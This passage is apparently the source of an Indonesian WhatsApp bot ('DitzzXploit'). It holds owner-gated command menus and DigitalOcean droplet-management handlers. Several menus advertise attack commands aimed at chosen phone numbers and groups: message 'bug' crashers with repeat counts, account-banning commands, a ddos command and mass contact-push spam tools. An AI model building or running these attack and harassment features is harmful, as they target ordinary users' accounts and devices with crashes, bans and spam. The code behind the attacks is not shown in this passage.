⭔${prefix}updatesrv
⭔${prefix}suspend *id*
⭔${prefix}unsuspend *id*
⭔${prefix}crateadmin
⭔${prefix}listadmin
⭔${prefix}buysewa
⭔${prefix}sewa

 Powered By *@${owned.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
DitzzXploit.sendMessage(m.chat, {
text: textbi,
contextInfo: {
externalAdReply: {
showAdAttribution: true,
title: namaCreator,
body: 'YouTube By DitzzXploit',
thumbnailUrl: 'https://telegra.ph/file/bf92cff9507e94300fafe.jpg',
sourceUrl: "https://s.id/DitzzXploit",
mediaType: 1,
renderLargerThumbnail: true
}}}, {quoted: fkontak})
}
break
case "kudetmenu": {
if (!isOwner) return reply(`MAAF KAK INI SCRIPT PRIVATE 𝘼𝙍𝙂𝘼𝘼 𝙎𝙏𝙊𝙍𝙀🧐`)
const owned = `6281802527761@s.whatsapp.net`
const version = require("baileys/package.json").version
const text12 = `*Hi @${sender.split("@")[0]} 👋*

▭▬▭( *KUDETA MENU* )▭▬▭

⭔ ${prefix}allkudet
⭔ ${prefix}kudet

 Powered By *@${owned.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
DitzzXploit.sendMessage(m.chat, {
text: text12,
contextInfo: {
externalAdReply: {
showAdAttribution: true,
title: namaCreator,
body: 'YouTube By DitzzXploit',
thumbnailUrl: 'https://telegra.ph/file/bf92cff9507e94300fafe.jpg',
sourceUrl: "https://s.id/DitzzXploit",
mediaType: 1,
renderLargerThumbnail: true
}}}, {quoted: fkontak})
}
break
case "bugmenu": {
if (!isOwner) return reply(`MAAF KAK INI SCRIPT PRIVATE 𝘼𝙍𝙂𝘼𝘼 𝙎𝙏𝙊𝙍𝙀🧐`)
const owned = `6281802527761@s.whatsapp.net`
const version = require("baileys/package.json").version
const text12 = `*Hi @${sender.split("@")[0]} 👋*

▭▬▭( *BUG MENU* )▭▬▭

⭔ ${prefix}kontolbug
⭔ ${prefix}sepuhcrash 
⭔ ${prefix}bugnew
⭔ ${prefix}reportbug

 Powered By *@${owned.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
DitzzXploit.sendMessage(m.chat, {
text: text12,
contextInfo: {
externalAdReply: {
showAdAttribution: true,
title: namaCreator,
body: 'Kroco',
thumbnailUrl: 'https://telegra.ph/file/bf92cff9507e94300fafe.jpg',
sourceUrl: "https://telegra.ph/file/bf92cff9507e94300fafe.jpg",
mediaType: 1,
renderLargerThumbnail: true
}}}, {quoted: fkontak})
}
break
case "textmenu": {
if (!isOwner) return reply(`MAAF KAK INI SCRIPT PRIVATE 𝘼𝙍𝙂𝘼𝘼 𝙎𝙏𝙊𝙍𝙀🧐`)
const owned = `6281802527761@s.whatsapp.net`
const version = require("baileys/package.json").version
const text12 = `*Hi @${sender.split("@")[0]} 👋*

▭▬▭( *TEXT MENU* )▭▬▭

● ${prefix}fakec1
● ${prefix}fakec2
● ${prefix}fakec3
● ${prefix}fakec4
● ${prefix}fakec5
● ${prefix}fakec6
● ${prefix}fakec7
● ${prefix}fakec8
● ${prefix}fakec9
● ${prefix}fakec10
● ${prefix}fakec11
● ${prefix}textunbanv1
● ${prefix}textunbanv2
● ${prefix}textunbanv3
● ${prefix}textunbanv4
● ${prefix}textunbanv5
● ${prefix}textunbanv6
● ${prefix}textunbanv7
● ${prefix}textunbanv8
● ${prefix}textunbanv9
● ${prefix}textunbanv10
● ${prefix}textunbanv11
● ${prefix}textunbanv12
● ${prefix}textunbanv13
● ${prefix}textunbanv14
● ${prefix}textunbanv15
● ${prefix}textunbanv16
● ${prefix}textunbanv17
● ${prefix}textunbanv18
● ${prefix}textunbanv19
● ${prefix}textunbanv20
● ${prefix}textunbanv21
● ${prefix}textbanv1
● ${prefix}textbanv2
● ${prefix}textbanv3
● ${prefix}textbanv4
● ${prefix}textbanv5
● ${prefix}textbanv6
● ${prefix}textbanv7
● ${prefix}textbanv8
● ${prefix}textbanv9
● ${prefix}textbanv10
● ${prefix}textbanv11
● ${prefix}textbanv12
● ${prefix}textbanv13
● ${prefix}textbanv14
● ${prefix}textbanv15
● ${prefix}textbanv16
● ${prefix}textbanv17
● ${prefix}textbanv18
● ${prefix}textbanv19
● ${prefix}textbanv20
● ${prefix}textbanv21
● ${prefix}textbanv22
● ${prefix}textbanv23
● ${prefix}textbanv24
● ${prefix}textbanv25
● ${prefix}textbanv26
● ${prefix}textbanv27
● ${prefix}textbanv28
● ${prefix}textbanv29
● ${prefix}textbanv30
● ${prefix}textbanv31
● ${prefix}textbanv32
● ${prefix}textbanv33
● ${prefix}textbanv34
● ${prefix}textbanv35
● ${prefix}textbanv36
● ${prefix}textbanv37
● ${prefix}textbanv38
● ${prefix}textunbanpremv1
● ${prefix}textunbanpremv2
● ${prefix}textunbanpremv3

 Textmenu by *@${owned.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
DitzzXploit.sendMessage(m.chat, {
text: text12,
contextInfo: {
externalAdReply: {
showAdAttribution: true,
title: namaCreator,
body: 'YouTube By DitzzXploit',
thumbnailUrl: 'https://telegra.ph/file/7e1f0521e65c99289d9ea.jpg',
sourceUrl: "https://s.id/DitzzXploit",
mediaType: 1,
renderLargerThumbnail: true
}}}, {quoted: fkontak})
}
break
case "linodemenu": {
const owned = `6281802527761@s.whatsapp.net`
const text12 = `*Hi @${sender.split("@")[0]} 👋*

▭▬▭( *LINODE MENU* )▭▬▭

⭔ ${prefix}resetpassword
⭔ ${prefix}deletelinode
⭔ ${prefix}listlinode
⭔ ${prefix}onlinode
⭔ ${prefix}offlinode
⭔ ${prefix}rebootlinode
⭔ ${prefix}sisalinode
⭔ ${prefix}rebuildlinode
⭔ ${prefix}saldolinode
⭔ ${prefix}cekvps
⭔ ${prefix}linode2gb
⭔ ${prefix}linode4gb
⭔ ${prefix}linode8gb

 Powered By *@${owned.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
DitzzXploit.sendMessage(m.chat, {
text: text12,
contextInfo: {
externalAdReply: {
showAdAttribution: true,
title: namaCreator,
body: 'YouTube By DitzzXploit',
thumbnailUrl: 'https://telegra.ph/file/7e1f0521e65c99289d9ea.jpg',
sourceUrl: "https://s.id/DitzzXploit",
mediaType: 1,
renderLargerThumbnail: true
}}}, {quoted: fkontak})
}
break
case "scmenu": {
if (!isOwner) return reply(`MAAF KAK INI SCRIPT PRIVATE 𝘼𝙍𝙂𝘼𝘼 𝙎𝙏𝙊𝙍𝙀🧐`)
if (!isOwner) return reply(`Khusus Pedia Official Aja`)
const owned = `6281802527761@s.whatsapp.net`
const version = require("baileys/package.json").version
const text12 = `*Hi @${sender.split("@")[0]} 👋*

▭▬▭( *KHUSUS RAFATHAR* )▭▬▭

⭔ ${prefix}ambilsc1
⭔ ${prefix}ambilsc2
⭔ ${prefix}ambilsc3
⭔ ${prefix}ambilsc4
⭔ ${prefix}ambilsc5
⭔ ${prefix}ambilsc6

 *_Note : Sc Free Nanti Menambah Tunggu Owner Saya Meng Update Terimakasih._*
 Powered By *@${owned.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
DitzzXploit.sendMessage(m.chat, {
text: text12,
contextInfo: {
externalAdReply: {
showAdAttribution: true,
title: namaCreator,
body: 'YouTube By DitzzXploit',
thumbnailUrl: 'https://telegra.ph/file/7e1f0521e65c99289d9ea.jpg',
sourceUrl: "https://s.id/DitzzXploit",
mediaType: 1,
renderLargerThumbnail: true
}}}, {quoted: fkontak})
}

break
case "Zans": {
if (!isOwner) return reply(`MAAF KAK INI SCRIPT PRIVATE 𝘼𝙍𝙂𝘼𝘼 𝙎𝙏𝙊𝙍𝙀🧐`)
if (!isOwner) return reply(`Khusus Rafathar Offcial Aja`)
const owned = `6281802527761@s.whatsapp.net`
const version = require("baileys/package.json").version
const text12 = `*Hi @${sender.split("@")[0]} 👋*

▭▬▭( *KHUSUS ZANS* )▭▬▭

⭔ ${prefix}rafathar1
⭔ ${prefix}rafathar2
⭔ ${prefix}rafathar3

 Powered By *@${owned.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
DitzzXploit.sendMessage(m.chat, {
text: text12,
contextInfo: {
externalAdReply: {
showAdAttribution: true,
title: namaCreator,
body: 'YouTube By DitzzXploit',
thumbnailUrl: 'https://telegra.ph/file/7e1f0521e65c99289d9ea.jpg',
sourceUrl: "https://s.id/DitzzXploit",
mediaType: 1,
renderLargerThumbnail: true
}}}, {quoted: fkontak})
}
break
case "otpmenu": {
if (!isOwner) return reply(`MAAF KAK INI SCRIPT PRIVATE 𝘼𝙍𝙂𝘼𝘼 𝙎𝙏𝙊𝙍𝙀🧐`)
const owned = `6281802527761@s.whatsapp.net`
const version = require("baileys/package.json").version
const text12 = `*Hi @${sender.split("@")[0]} 👋*

▭▬▭( *OTP MENU* )▭▬▭

⭔ ${prefix}profile
⭔ ${prefix}layanan
⭔ ${prefix}wanumber
⭔ ${prefix}neednokos
⭔ ${prefix}nokoswa
⭔ ${prefix}order
⭔ ${prefix}getorder
⭔ ${prefix}nowa

 Powered By *@${owned.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
DitzzXploit.sendMessage(m.chat, {
text: text12,
contextInfo: {
externalAdReply: {
showAdAttribution: true,
title: namaCreator,
body: 'YouTube By DitzzXploit',
thumbnailUrl: 'https://telegra.ph/file/7e1f0521e65c99289d9ea.jpg',
sourceUrl: "https://s.id/DitzzXploit",
mediaType: 1,
renderLargerThumbnail: true
}}}, {quoted: fkontak})
}
break
case "listmenu": {
if (!isOwner) return reply(`MAAF KAK INI SCRIPT PRIVATE 𝘼𝙍𝙂𝘼𝘼 𝙎𝙏𝙊𝙍𝙀🧐`)
const owned = `6281802527761@s.whatsapp.net`
const version = require("baileys/package.json").version
const text12 = `*Hi @${sender.split("@")[0]} 👋*

▭▬▭( *LIST MENU* )▭▬▭

⭔ ${prefix}listvps1 

 Powered By *@${owned.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
DitzzXploit.sendMessage(m.chat, {
text: text12,
contextInfo: {
externalAdReply: {
showAdAttribution: true,
title: namaCreator,
body: 'YouTube By DitzzXploit',
thumbnailUrl: 'https://telegra.ph/file/7e1f0521e65c99289d9ea.jpg',
sourceUrl: "https://s.id/DitzzXploit",
mediaType: 1,
renderLargerThumbnail: true
}}}, {quoted: fkontak})
}
break
case "listvps1": {
if (!isOwner) return reply(`MAAF KAK INI SCRIPT PRIVATE DitzzXploit🧐`)
const owned = `6281802527761@s.whatsapp.net`
const version = require("baileys/package.json").version
const text12 = `*Hi @${sender.split("@")[0]} 👋*

▬▭( *LIST VPS LINODE* )▭▬▭

🚀 RAM 1GB CORE 1 : => *20K* <=
🚀 RAM 2GB CORE 1 : => *25K* <=
🚀 RAM 4GB CORE 2 : => *45K* <=
🚀 RAM 8GB CORE 4 : => *55K* <=
🚀 RAM 16GB CORE 6 : => *80K* <=

=>   *_𝙂𝙤𝙤𝙙 𝙌𝙪𝙖𝙡𝙞𝙩𝙮 ✅_* <=
=>   *_𝘽𝙚𝙧𝙜𝙖𝙧𝙖𝙣𝙨𝙞 ✅_*      <=
=>   *_𝘿𝙖𝙥𝙚𝙩 𝘽𝙤𝙣𝙪𝙨 ✅_*  <=

*‼️GARANSI ON JIKA TIDAK MELANGGAR TOS!!!*
1. NO MINING
2. NO CPU 100%
3. NO USE DDOS
*_GARANSI 10H ON ✅_*

*JIKA MELANGGAR T.O.S GARANSI HANGUS!!!*

*MAU CLAIM GARANSI? KIRIM BUKTI TRANSFER & CHAT*
‼️NO BUKTI NO GARANSI
‼️ MAKSA REFF NO BUKTI? BLOCK!!! 

*KEUNTUNGAN BUY VPS?*
📍BISA OPEN ADMIN PANEL
📍BISA OPEN RESELLER PANEL
📍BISA DI PAKAI BUAT SERVER PRIBADI
📍BISA JUALAN PANEL
📍BISA OPEN JASA RUN BOT
📍BISA OPEN MURPUSH
📍BISA OPEN MURBUG DLL

 Powered By *@${owned.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
DitzzXploit.sendMessage(m.chat, {
text: text12,
contextInfo: {
externalAdReply: {
showAdAttribution: true,
title: namaCreator,
body: 'YouTube By DitzzXploit',
thumbnailUrl: 'https://telegra.ph/file/7e1f0521e65c99289d9ea.jpg',
sourceUrl: "https://s.id/DitzzXploit",
mediaType: 1,
renderLargerThumbnail: true
}}}, {quoted: fkontak})
}
break
case "groupmenu": {
if (!isOwner) return reply(`MAAF KAK INI SCRIPT PRIVATE 𝘼𝙍𝙂𝘼𝘼 𝙎𝙏𝙊𝙍𝙀🧐`)
const txtus = `*Hi @${sender.split("@")[0]} 👋*

┌──『 *MENU GROUP* 』
│ ${prefix}owner
│ ${prefix}qc *teks*
│ ${prefix}tts *teks*
│ ${prefix}sticker *reply image*
│ ${prefix}linkgroup
│ ${prefix}hidetag *teks*
│ ${prefix}setppbot *teks*
│ ${prefix}setppgroup *teks*
│ ${prefix}delppgc
│ ${prefix}add *nomor*
│ ${prefix}kick *nomor*
│ ${prefix}promote *nomor*
│ ${prefix}demote *nomor*
│ ${prefix}promoteall *nomor*
│ ${prefix}demoteall *nomor*
│ ${prefix}antilinkytch *on/off*
│ ${prefix}antilinkytvid *on/off*
│ ${prefix}antilinktwitter *on/off*
│ ${prefix}antilinktiktok *on/off*
│ ${prefix}antilinktelegram *on/off*
│ ${prefix}antilinkfacebook *on/off*
│ ${prefix}antilinkinstagram *on/off*
│ ${prefix}antipannel *on/off*
│ ${prefix}antilinkall *on/off*
│ ${prefix}antiwame *on/off*
│ ${prefix}antilinkgc *on/off*
│ ${prefix}antivirus *on/off*
└──────`
reply(txtus)
}
break
case "ownermenu": {
if (!isOwner) return reply(`MAAF KAK INI SCRIPT PRIVATE 𝘼𝙍𝙂𝘼𝘼 𝙎𝙏𝙊𝙍𝙀🧐`)
const txtow = `*Hi @${sender.split("@")[0]} 👋*

┌──『 *MENU OWNER* 』
│ ${prefix}addowner *nomor*
│ ${prefix}delowner *nomor*
│ ${prefix}addprem *nomor*
│ ${prefix}delprem *nomor*
│ ${prefix}setbotname *teks*
│ ${prefix}setbotbio *teks*
│ ${prefix}rafathar
│ ${prefix}accreport
│ ${prefix}listonline
│ ${prefix}vidowner1
│ ${prefix}closetime
│ ${prefix}opentime
│ ${prefix}delete
│ ${prefix}totag
│ ${prefix}pesan
│ ${prefix}leave
│ ${prefix}ddos
│ ${prefix}sendgc
│ ${prefix}sosmed
│ ${prefix}sewabot
│ ${prefix}creategc *teksgc*
│ ${prefix}sdomain/sendomain
│ ${prefix}spanel/sendpanel
│ ${prefix}svps/sendvps
│ ${prefix}autojpm *on/off*
│ ${prefix}public *on/off*
│ ${prefix}self *on/off*
│ ${prefix}addip *ip*
│ ${prefix}ambilfitur
│ ${prefix}ambilcase
│ ${prefix}totalfitur
│ ${prefix}addpm2
│ ${prefix}getpm2
│ ${prefix}getbot
│ ${prefix}getbio
│ ${prefix}listpc
│ ${prefix}listgc
│ ${prefix}listblock
│ ${prefix}unblock
│ ${prefix}block
│ ${prefix}enc
└──────`
reply(txtow)
}
break
case "pushkontakmenu": {
if (!isOwner) return reply(`MAAF KAK INI SCRIPT PRIVATE 𝘼𝙍𝙂𝘼𝘼 𝙎𝙏𝙊𝙍𝙀🧐`)
const txtpu = `*Hi @${sender.split("@")[0]} 👋*

┌──『 *MENU PUSHKONTAK* 』
│ ${prefix}cekidgc
│ ${prefix}listgroup
│ ${prefix}pushkontakv1 *idgc|teks*
│ ${prefix}pushkontakv2 *teks*
│ ${prefix}pushkontakv3 *idgroup|jeda|teks*
│ ${prefix}pushkontakv4 *jeda|teks*
│ ${prefix}savecontactv1 *idgroup*
│ ${prefix}savecontactv2 *teks*
│ ${prefix}savekontak *teks*
│ ${prefix}getcontact *teks*
│ ${prefix}sendkontak *teks*
│ ${prefix}bcvideo *teks*
│ ${prefix}bcgc *teks*
│ ${prefix}jpm *teks*
└──────`
reply(txtpu)
}
break
case "bugnumber": {
const owned = `6281802527761@s.whatsapp.net`
const txtat = `*Hi @${sender.split("@")[0]} 👋*
_LIST MENU BUG BY *© Zans Official*_
▬▭▬▭▬▭▬▭▬▭▬▭▬▭

「 *BUG ATTACK NUMBER* 」
● ${prefix}gas *nomor|jumlah*
● ${prefix}kill *nomor|jumlah*
● ${prefix}crash *nomor|jumlah*
● ${prefix}shoot *nomor|jumlah*
● ${prefix}bugkuy *nomor|jumlah*
● ${prefix}duarr *nomor|jumlah*
● ${prefix}killyou *nomor|jumlah*
● ${prefix}doblekill *nomor|jumlah*
● ${prefix}triplekill *nomor|jumlah*
● ${prefix}savage *nomor|jumlah*
● ${prefix}santet *nomor|jumlah*
● ${prefix}danger *nomor|jumlah*
● ${prefix}meninggal *nomor|jumlah*
● ${prefix}headshot *nomor|jumlah*
● ${prefix}mati *nomor|jumlah*

 Powered By *@${owned.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
reply(txtat)
}
break
case "buggroup":{
const owned = `6281802527761@s.whatsapp.net`
const txtv1 = `*Hi @${sender.split("@")[0]} 👋*
_LIST MENU BUG BY *© Pedia Official*_
▬▭▬▭▬▭▬▭▬▭▬▭▬▭

「 *BUG ATTACK GROUP v1* 」
● ${prefix}killgc *linkgc|jumlah*
● ${prefix}santetgc *linkgc|jumlah*
● ${prefix}gcwakwaw *linkgc|jumlah*
● ${prefix}togc *linkgc|jumlah*
● ${prefix}matigc *linkgc|jumlah*
● ${prefix}kuygc *linkgc|jumlah*
● ${prefix}attackgc *linkgc|jumlah*
● ${prefix}mampusgc *linkgc|jumlah*
● ${prefix}gasgc *linkgc|jumlah*
● ${prefix}ampasgc *linkgc|jumlah*
● ${prefix}bahayagc *linkgc|jumlah*
● ${prefix}hatihatigc *linkgc|jumlah*
● ${prefix}crashgc *linkgc|jumlah*
● ${prefix}stuckgc *linkgc|jumlah*
● ${prefix}ganasgc *linkgc|jumlah*

「 *BUG ATTACK GROUP v2* 」
● ${prefix}buggc *idgroup|jumlah*
● ${prefix}shootgc *idgroup|jumlah*
● ${prefix}dorrgc *idgroup|jumlah*
● ${prefix}attackgc1 *idgroup|jumlah*
● ${prefix}meninggalgc *idgroup|jumlah*
● ${prefix}matigc1*idgroup|jumlah*
● ${prefix}seranggc *idgroup|jumlah*
● ${prefix}bomgc *idgroup|jumlah*
● ${prefix}ledakangc *idgroup|jumlah*
● ${prefix}atomgc *idgroup|jumlah*
● ${prefix}hancurgc *idgroup|jumlah*
● ${prefix}bugzirgc *idgroup|jumlah*
● ${prefix}stuckgc2 *idgroup|jumlah*
● ${prefix}baugc *idgroup|jumlah*
● ${prefix}ultigc *idgroup|jumlah*

 Powered By *@${owned.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
reply(txtv1)
}
break
case "bannedmenu":{
const txtv2 = `┏━┳┳┳━┳┳┓
┃━┫┃┃┏┫━┫┏┓
┃┏┫┃┃┗┫┃┃┃┃
┗┛┗━┻━┻┻┛┃┃
┏┳┳━┳┳┳┓┏┫┣┳┓
┃┃┃┃┃┃┃┃┣┻┫┃┃
┣┓┃┃┃┃┣┫┃┏┻┻┫
┗━┻━┻━┻┛┗┛━━┛

┌──『 *MENU BANNED* 』
│ ${prefix}call *nomor*
│ ${prefix}out *nomor*
│ ${prefix}verif *nomor*
│ ${prefix}kenon *nomor*
│ ${prefix}bannedv1 *nomor*
│ ${prefix}bannedv2 *nomor*
│ ${prefix}bannedv3 *nomor*
│ ${prefix}bannedv4 *nomor*
│ ${prefix}bannedv5 *nomor*
│ ${prefix}bannedv6 *nomor*
└──────`
reply(txtv2)
}
break
case "unbanmenu":{
const txt226 = `┏━┳┳┳━┳┳┓
┃━┫┃┃┏┫━┫┏┓
┃┏┫┃┃┗┫┃┃┃┃
┗┛┗━┻━┻┻┛┃┃
┏┳┳━┳┳┳┓┏┫┣┳┓
┃┃┃┃┃┃┃┃┣┻┫┃┃
┣┓┃┃┃┃┣┫┃┏┻┻┫
┗━┻━┻━┻┛┗┛━━┛

┌──『 *MENU UNBANNED* 』
│ ${prefix}unbannedv1 *nomor*
│ ${prefix}unbannedv2 *nomor*
│ ${prefix}unbannedv3 *nomor*
│ ${prefix}unbannedv4 *nomor*
│ ${prefix}unbannedv5 *nomor*
│ ${prefix}unbannedv6 *nomor*
└──────`
reply(txt226)
}
break
        case "otomatismenu": {
const owned = `6281802527761@s.whatsapp.net`
const version = require("baileys/package.json").version
const textoto = `*Hi @${sender.split("@")[0]} 👋*
▬▭( *ALL OTOMATIS* )▭▬
*OTOMATIS SEMUA ASAL ADA SALDO*
SALDO ANDA : Rp : ${toRupiah(cekSaldo(sender, db_saldo))}

⭔ ${prefix}buysc
⭔ ${prefix}buyakn
⭔ ${prefix}buyvps
⭔ ${prefix}buysrv 
⭔ ${prefix}deposit
⭔ ${prefix}buyprem
⭔ ${prefix}buyowner
⭔ ${prefix}adminpanel
⭔ ${prefix}cekharga
⭔ ${prefix}payment
⭔ ${prefix}donasi
⭔ ${prefix}jasa
⭔ ${prefix}vps
⭔ ${prefix}addcase

 Powered By *@${owned.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
DitzzXploit.sendMessage(from, { text: textoto, contextInfo: { mentionedJid: [sender, owned], forwardingScore: 9999, isForwarded: true }}, { quoted: m })
}
break 
case "vpsmenu":{
const owned = `6281802527761@s.whatsapp.net`
const version = require("baileys/package.json").version
    const cvps = `*Hi @${sender.split("@")[0]} 👋*

╭─━─━─〘 *VPS MENU* 〙─━─━─━
│➵ ${prefix}deldroplet
│➵ ${prefix}svps / sendvps
│➵ ${prefix}sdomain / sendomain
│➵ ${prefix}listdroplet
│➵ ${prefix}cekdroplet
│➵ ${prefix}turnoff
│➵ ${prefix}turnon
│➵ ${prefix}sisadroplet
│➵ ${prefix}rebuild
│➵ ${prefix}restartvps
│➵ ${prefix}vps1g1c
│➵ ${prefix}vps2g1c
│➵ ${prefix}vps4g2c
│➵ ${prefix}vps8g4c
│
╰━─━〘 Powered By *@${owned.split("@")[0]}* 〙━─━

`
DitzzXploit.sendMessage(m.chat, {
text: cvps,
contextInfo: {
externalAdReply: {
showAdAttribution: true,
title: namaCreator,
body: 'YouTube By DitzzXploit',
thumbnailUrl: 'https://telegra.ph/file/bf92cff9507e94300fafe.jpg',
sourceUrl: "https://s.id/DitzzXploit",
mediaType: 1,
renderLargerThumbnail: true
}}}, {quoted: fkontak})
}
break
case "sisadroplet":{
if (!isOwner) return reply(`Ga Usah Sok Asik Anjg`)
async function getDropletInfo() {
  try {
    const accountResponse = await axios.get('https://api.digitalocean.com/v2/account', {
      headers: {
        Authorization: `Bearer ${API_TOKEN}`,
      },
    });

    const dropletsResponse = await axios.get('https://api.digitalocean.com/v2/droplets', {
      headers: {
        Authorization: `Bearer ${API_TOKEN}`,
      },
    });

    if (accountResponse.status === 200 && dropletsResponse.status === 200) {
      const dropletLimit = accountResponse.data.account.droplet_limit;
      const dropletsCount = dropletsResponse.data.droplets.length;
      const remainingDroplets = dropletLimit - dropletsCount;

      return {
        dropletLimit,
        remainingDroplets,
        totalDroplets: dropletsCount,
      };
    } else {
      throw new Error('Gagal mendapatkan data akun DigitalOcean atau droplet.');
    }
  } catch (error) {
    throw error;
  }
}

// Definisikan fungsi untuk mengeksekusi kasus "sisadroplet"
async function sisadropletHandler() {
  try {
    if (!isOwner) {
      return m.reply('Lu Siapanya Gua Anjg');
    }

    const dropletInfo = await getDropletInfo();
    m.reply(`*Sisa Droplet Yang Dapat Anda Pakai: ${dropletInfo.remainingDroplets}*

*Total Droplet Yang Sudah Terpakai: ${dropletInfo.totalDroplets}*`);
  } catch (error) {
    m.reply(`Terjadi kesalahan: ${error.message}`);
  }
}

  sisadropletHandler();
  break;
}
case "restartvps": {
    if (!isOwner) return reply(`Sok Asik Anjg`)
  let dropletId = args[0];
  if (!dropletId) return m.reply('ID droplet belum diberikan.');

  // Fungsi untuk melakukan restart VPS berdasarkan ID droplet
  const restartVPS = async (dropletId) => {
    try {
      const apiUrl = `https://api.digitalocean.com/v2/droplets/${dropletId}/actions`;

      const response = await fetch(apiUrl, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${API_TOKEN}`
        },
        body: JSON.stringify({
          type: 'reboot'
        })
      });

      if (response.ok) {
        const data = await response.json();
        return data.action;
      } else {
        const errorData = await response.json();
        reply(`Gagal melakukan restart VPS: ${errorData.message}`);
      }
    } catch (error) {
      reply('Terjadi kesalahan saat melakukan restart VPS:', error.message);
      reply('Terjadi kesalahan saat melakukan restart VPS.');
    }
  };

  restartVPS(dropletId)
    .then((action) => {
      reply(`Aksi restart VPS berhasil dimulai. Status aksi: ${action.status}`);
    })
    .catch((err) => {
      reply(err);
    });

  break;
}
case "turnoff": {
  if (!isOwner) return reply(`Sok Asik Anjg`);
  
  let dropletId = args[0];
  if (!dropletId) return m.reply('ID droplet belum diberikan.');

  async function turnOffDroplet() {
    try {
      const response = await axios.post(
        `https://api.digitalocean.com/v2/droplets/${dropletId}/actions`,
        {
          type: 'power_off',
        },
        {
          headers: {
            'Content-Type': 'application/json',
            Authorization: `Bearer ${API_TOKEN}`,
          },
        }
      );

      if (response.status === 201 && response.data.action && response.data.action.status === 'in-progress') {
        reply('VPS (Droplet) sedang dimatikan...');
      } else {
        reply('Gagal mematikan VPS (Droplet).');
      }
    } catch (error) {
      reply('Terjadi kesalahan saat mematikan VPS (Droplet):', error.message);
    }
  }

  turnOffDroplet();
  break;
}

        
case "turnon": {
  if (!isOwner) return reply(`Sok Asik Anjg`);
  
  let dropletId = args[0];
  if (!dropletId) return m.reply('ID droplet belum diberikan.');

  async function turnOnDroplet() {
    try {
      const response = await axios.post(
        `https://api.digitalocean.com/v2/droplets/${dropletId}/actions`,
        {
          type: 'power_on',
        },
        {
          headers: {
            'Content-Type': 'application/json',
            Authorization: `Bearer ${API_TOKEN}`,
          },
        }
      );

      if (response.status === 201 && response.data.action && response.data.action.status === 'in-progress') {
        reply('VPS (Droplet) sedang dihidupkan...');
      } else {
        reply('Gagal menghidupkan VPS (Droplet).');
      }
    } catch (error) {
      reply('Terjadi kesalahan saat menghidupkan VPS (Droplet):', error.message);
    }
  }

  turnOnDroplet();
  break;
}
        
        
case "rebuild": {
  if (!isOwner) return m.reply(`Lu Siapanya Gua Anjg Gausah Nyuruh Nyuruh Gua Anjg`);

  let dropletId = args[0];
  if (!dropletId) return m.reply('ID droplet belum diberikan.');

  let rebuildVPS = async () => {
    try {
      // Rebuild droplet menggunakan API DigitalOcean
      const response = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}/actions`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${API_TOKEN}`
        },
        body: JSON.stringify({
          type: 'rebuild',
          image: 'ubuntu-20-04-x64' // Ganti dengan slug image yang ingin digunakan untuk rebuild (misal: 'ubuntu-18-04-x64')
        })
      });

      if (response.ok) {
        const data = await response.json();
        reply('Rebuild VPS berhasil dimulai. Status aksi:', data.action.status);

        // Mendapatkan informasi VPS setelah rebuild
        const vpsInfo = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
          method: 'GET',
          headers: {
            'Content-Type': 'application/json',
            'Authorization': `Bearer ${API_TOKEN}`
          }
        });

        if (vpsInfo.ok) {
          const vpsData = await vpsInfo.json();
          const droplet = vpsData.droplet;
          const ipv4Addresses = droplet.networks.v4.filter(network => network.type === 'public');
          const ipAddress = ipv4Addresses.length > 0 ? ipv4Addresses[0].ip_address : 'Tidak ada IP';

          const textvps = `*VPS SUKSES REBUILD*\nIP VPS: ${ipAddress}\nSYSTEM IMAGE: ${droplet.image.slug}`;
          await sleep(60000) 
 DitzzXploit.sendMessage(m.chat, { text: textvps });
        } else {
          reply('Gagal mendapatkan informasi VPS setelah rebuild.');
        }
      } else {
        const errorData = await response.json();
        reply('Gagal melakukan rebuild VPS:', errorData.message);
      }
    } catch (error) {
      reply('Terjadi kesalahan saat melakukan rebuild VPS:', error);
    }
  };

  rebuildVPS();
}
break;

        case "deldroplet": {
  if (!isOwner) return m.reply('Maaf, command ini hanya untuk pemilik.');

  let dropletId = args[0];
  if (!dropletId) return m.reply('ID droplet belum diberikan.');

  let deleteDroplet = async () => {
    try {
      let response = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
        method: 'DELETE',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${API_TOKEN}`
        }
      });

      if (response.ok) {
        m.reply('Droplet berhasil dihapus.');
      } else {
        const errorData = await response.json();
        throw new Error(`Gagal menghapus droplet: ${errorData.message}`);
      }
    } catch (error) {
      console.error('Terjadi kesalahan saat menghapus droplet:', error);
      m.reply('Terjadi kesalahan saat menghapus droplet.');
    }
  };

  deleteDroplet();

  break;
}
 case "listdroplet": {
  if (!isOwner) return m.reply("Anda bukan pemilik.");

  try {
    const getDroplets = async () => {
      try {
        const response = await fetch('https://api.digitalocean.com/v2/droplets', {
          headers: {
            Authorization: "Bearer " + API_TOKEN
          }
        });
        const data = await response.json();
        return data.droplets || [];
      } catch (error) {
        reply('Error fetching droplets: ' + error);
        return [];
      }
    };

    getDroplets().then(droplets => {
      let totalvps = droplets.length;
      let mesej = `List Droplet Digital Ocean Anda: ${totalvps}\n\n▬▭▬▭▬▭▬▭▬▭▬▭▬\n`;

      if (droplets.length === 0) {
        mesej += 'Tidak ada Droplet yang tersedia.';
      } else {
        droplets.forEach(droplet => {
          const ipv4Addresses = droplet.networks.v4.filter(network => network.type === "public");
          const ipAddress = ipv4Addresses.length > 0 ? ipv4Addresses[0].ip_address : 'Tidak ada IP';
